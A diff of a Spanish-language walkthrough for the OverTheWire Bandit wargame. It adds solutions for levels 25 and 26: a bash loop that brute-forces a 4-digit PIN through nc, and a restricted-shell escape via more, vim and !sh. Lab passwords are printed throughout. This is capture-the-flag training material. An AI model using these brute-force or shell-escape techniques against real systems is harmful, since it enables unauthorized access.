@@ -310,7 +310,7 @@ drwxr-xr-x 41 root     root     4096 May  7 20:14 ..
 >ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme
 IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
 ```
-Salimos a nuestro sistema y nos logeamos con el siguiente usuario usando la clave RSA obtenida
+Salimos a nuestro sistema y nos logeamos con el siguiente usuario usando la clave obtenida
 ```
 ssh bandit19@bandit.labs.overthewire.org -p 2220
 ```
@@ -332,7 +332,7 @@ bash-4.4$ cat /etc/bandit_pass/bandit20
 GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 bash-4.4$ 
 ```
-Salimos a nuestro sistema y nos logeamos con el siguiente usuario usando la clave RSA obtenida
+Salimos a nuestro sistema y nos logeamos con el siguiente usuario usando la clave obtenida
 ```
 ssh bandit20@bandit.labs.overthewire.org -p 2220
 ```
@@ -345,7 +345,7 @@ Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 Password matches, sending next password
 gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
 ```
-Salimos a nuestro sistema y nos logeamos con el siguiente usuario usando la clave RSA obtenida
+Salimos a nuestro sistema y nos logeamos con el siguiente usuario usando la clave obtenida
 ```
 ssh bandit21@bandit.labs.overthewire.org -p 2220
 ```
@@ -361,7 +361,7 @@ cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 >cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
 ```
-Salimos a nuestro sistema y nos logeamos con el siguiente usuario usando la clave RSA obtenida
+Salimos a nuestro sistema y nos logeamos con el siguiente usuario usando la clave obtenida
 ```
 ssh bandit22@bandit.labs.overthewire.org -p 2220
 ```
@@ -386,7 +386,7 @@ cat /etc/bandit_pass/$myname > /tmp/$mytarget
 >cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 ```
-Salimos a nuestro sistema y nos logeamos con el siguiente usuario usando la clave RSA obtenida
+Salimos a nuestro sistema y nos logeamos con el siguiente usuario usando la clave obtenida
 ```
 ssh bandit23@bandit.labs.overthewire.org -p 2220
 ```
@@ -424,12 +424,52 @@ cat /etc/bandit_pass/bandit24 > /tmp/srbleu/pass
 > cat /tmp/srbleu/pass
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ```
-Salimos a nuestro sistema y nos logeamos con el siguiente usuario usando la clave RSA obtenida
+Salimos a nuestro sistema y nos logeamos con el siguiente usuario usando la clave obtenida
 ```
 ssh bandit24@bandit.labs.overthewire.org -p 2220
 ```
 ## Level 25
+*A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.*
+Hagamos un script:
+```bash
+#!/bin/bash for i in {0000..9999}; do
+    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i | 
+    nc localhost 30002 | egrep -v "Exiting|Wrong|I am"
+done
+```
+Ejecutar esto nos da la siguiente contraseña:
+```
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+``` 
+Salimos a nuestro sistema y nos logeamos con el siguiente usuario usando la clave
+```
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+```
 ## Level 26
+*Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.*
+(Este nivel es bastante tricky)
+Veamos la shell en el /etc/passwd
+```
+>cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+```
+Tenemos la clave RSA del bandit26 pero al logearnos nos hace log out por la shell usada, veamos la shell que se usa:
+```
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+```
+Tenemos que forzar el uso de more para poder logearnos, usmos v para spawnear vim, y luego !sh para poder tener shell acces, desde aquí es cuestion de leer la pass
+```
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+```
+Salimos a nuestro sistema y nos logeamos con el siguiente usuario usando la clave
+```
+ssh bandit26@bandit.labs.overthewire.org -p 2220
+```
 ## Level 27
 ## Level 28
 ## Level 29
